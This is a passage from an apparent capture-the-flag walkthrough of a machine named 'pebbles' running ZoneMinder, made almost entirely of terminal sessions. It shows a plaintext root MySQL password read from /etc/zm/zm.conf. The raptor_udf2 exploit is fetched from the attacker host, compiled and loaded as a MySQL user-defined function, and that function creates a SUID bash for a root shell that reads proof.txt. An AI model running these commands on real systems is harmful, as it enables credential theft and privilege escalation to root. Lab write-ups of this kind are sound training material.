cd /usr/share/zoneminder/www
www-data@pebbles:/usr/share/zoneminder/www$ ls
ls
ajax  css     graphics  includes   js    skins  tools                                   api   events  images    index.php  lang  temp   views
www-data@pebbles:/usr/share/zoneminder/www$ 
```


```
www-data@pebbles:/usr/share/zoneminder/www/includes$ ls                                 ls                                                                                      Monitor.php  actions.php  control_functions.php  functions.php  logger.php
Server.php   config.php   database.php           lang.php                               www-data@pebbles:/usr/share/zoneminder/www/includes$ cat config.php                     cat config.php                                                                          <?php                                                                                   //                                                                                      // ZoneMinder web configuration file, $Date$, $Revision$
// Copyright (C) 2001-2008 Philip Coombes                                               //
// This program is free software; you can redistribute it and/or                        // modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2                       // of the License, or (at your option) any later version.                               //
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//                                                                                      // You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.         
// 

//                                                                                      // This section contains options substituted by the zmconfig.pl utility, do not edit these directly                                                                             //                                                                                      define( "ZM_CONFIG", "/etc/zm/zm.conf" );               // Path to config file
// Define, and override any given in config file
define( "ZM_VERSION", "1.29.0" );               // Version 

... 
```

```
www-data@pebbles:/usr/share/zoneminder/www/includes$ cat /etc/zm/zm.conf
cat /etc/zm/zm.conf
# ==========================================================================
#
# ZoneMinder Base Configuration, $Date$, $Revision$                                     #
# ==========================================================================
#                                                                                       # This file is generated by 'configure'. Care should be taken if manually
# editing this file as an changes may be overwritten by subsequent configuration        # or installations.                                                                     #

# Path to installed data directory, used mostly for finding DB upgrade scripts
ZM_PATH_DATA=/usr/share/zoneminder

# Path to ZoneMinder binaries                                                           ZM_PATH_BIN=/usr/bin                                                                                                                                                            # Path to ZoneMinder libraries (none at present, for future use)                        
ZM_PATH_LIB=/usr/lib/x86_64-linux-gnu
# Path to ZoneMinder configuration (this file only at present)
ZM_PATH_CONF=/etc/zm                                                                                                                                                            # Path to ZoneMinder web files
ZM_PATH_WEB=/usr/share/zoneminder/www                                                   
# Path to ZoneMinder cgi files
ZM_PATH_CGI=/usr/lib/zoneminder/cgi-bin

# Username and group that web daemon (httpd/apache) runs as
ZM_WEB_USER=www-data
ZM_WEB_GROUP=www-data                                                                   
# ZoneMinder database type: so far only mysql is supported
ZM_DB_TYPE=mysql

# ZoneMinder database hostname or ip address
ZM_DB_HOST=localhost                                                                                                                                                            # ZoneMinder database name                                                              ZM_DB_NAME=zm                                                                           
# ZoneMinder database user
ZM_DB_USER=root
                                                                                        # ZoneMinder database password                 ZM_DB_PASS=ShinyLucentMarker361

# Host of this machine
ZM_SERVER_HOST=
www-data@pebbles:/usr/share/zoneminder/www/includes$
```

### SQL Access

```
</zoneminder/www/includes$ mysql -uroot -pShinyLucentMarker361
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 37
Server version: 5.7.30-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its                       affiliates. Other names may be trademarks of their respective                           owners.
                                                                                        Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                                                                                                  mysql> ^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B
mysql>
mysql> \! bash
\! bash
www-data@pebbles:/usr/share/zoneminder/www/includes$ exit
exit
exit
mysql>
```

### SQL Compilation

```
└─# wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c       --2022-01-19 17:31:42--  https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3314 (3.2K) [text/plain]
Saving to: ‘raptor_udf2.c’

raptor_udf2.c         100%[=========================>]   3.24K  --.-KB/s    in 0s

2022-01-19 17:31:44 (9.55 MB/s) - ‘raptor_udf2.c’ saved [3314/3314]

┌──(root💀DESKTOP-61F9HO2)-[/tmp]
└─# 2gcc -g -c raptor_udf2.c
-bash: 2gcc: command not found
┌──(root💀DESKTOP-61F9HO2)-[/tmp]                                                       └─# gcc -g -c raptor_udf2.c
┌──(root💀DESKTOP-61F9HO2)-[/tmp]
└─# gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
gcc: error: unrecognized command-line option ‘-W1,-soname,raptor_udf2.so’               ┌──(root💀DESKTOP-61F9HO2)-[/tmp]
└─# gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc       ┌──(root💀DESKTOP-61F9HO2)-[/tmp]
└─# python3 -m http.server 8080                                                         Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```


```
www-data@pebbles:/var/www/html$ cd /tmp
cd /tmp                                                                                 www-data@pebbles:/tmp$ wget 192.168.49.58:8080/raptor_udf2.so                           wget 192.168.49.58:8080/raptor_udf2.so                                                  --2022-01-19 04:57:32--  http://192.168.49.58:8080/raptor_udf2.so
Connecting to 192.168.49.58:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17240 (17K) [application/octet-stream]
Saving to: 'raptor_udf2.so'                                                             
raptor_udf2.so      100%[===================>]  16.84K  99.1KB/s    in 0.2s

2022-01-19 04:57:32 (99.1 KB/s) - 'raptor_udf2.so' saved [17240/17240]

www-data@pebbles:/tmp$ mysql -uroot -pShinyLucentMarker361 
mysql -uroot -pShinyLucentMarker361
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 38                                                          Server version: 5.7.30-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.            
Oracle is a registered trademark of Oracle Corporation and/or its                       affiliates. Other names may be trademarks of their respective
owners.                                                                                 
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use mysql;                                                                       use mysql;
Reading table information for completion of table and column names                      You can turn off this feature to get a quicker startup with -A
                                                                                        Database changed
mysql> create table foo(line blob);
create table foo(line blob);
Query OK, 0 rows affected (0.02 sec)

mysql> create table foo(line blob);
create table foo(line blob);
Query OK, 0 rows affected (0.02 sec)
                                                                                        mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
insert into foo values(load_file('/tmp/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)
                                                                                        mysql> create function do_system returns integer soname 'raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
ERROR 1126 (HY000): Can't open shared library 'raptor_udf2.so' (errno: 11 /usr/lib/mysql
/plugin/raptor_udf2.so: cannot open shared object file: No such file or directory)
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select do_system('cp /bin/bash /home/sally/suidbash && chmod 777 /home/sally/suid
bash && chmod u+s /home/sally/suidbash');
select do_system('cp /bin/bash /home/sally/suidbash && chmod 777 /home/sally/suidbash && chmod u+s /home/sally/suidbash');
+---------------------------------------------------------------------------------------
-----------------------------+
| do_system('cp /bin/bash /home/sally/suidbash && chmod 777 /home/sally/suidbash && chmod u+s /home/sally/suidbash') |
+---------------------------------------------------------------------------------------
-----------------------------+
|
                           0 |                                                          +---------------------------------------------------------------------------------------
-----------------------------+                                                          1 row in set (0.02 sec)

mysql> exit
exit
Bye
www-data@pebbles:/tmp$ /home/sally/suidbash -p
/home/sally/suidbash -p
suidbash-4.3# cd /root
cd /root
suidbash-4.3# cat proof.txt
cat proof.txt
c830e16e05f70e7e58e329ec5de1225b
suidbash-4.3# ifconfig
ifconfig
ens160    Link encap:Ethernet  HWaddr 00:50:56:ba:c0:0b                                           inet addr:192.168.58.52  Bcast:192.168.58.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1                                      RX packets:1087 errors:0 dropped:0 overruns:0 frame:0
          TX packets:775 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:175837 (175.8 KB)  TX bytes:193633 (193.6 KB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:1338 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1338 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:124565 (124.5 KB)  TX bytes:124565 (124.5 KB)

suidbash-4.3#
```
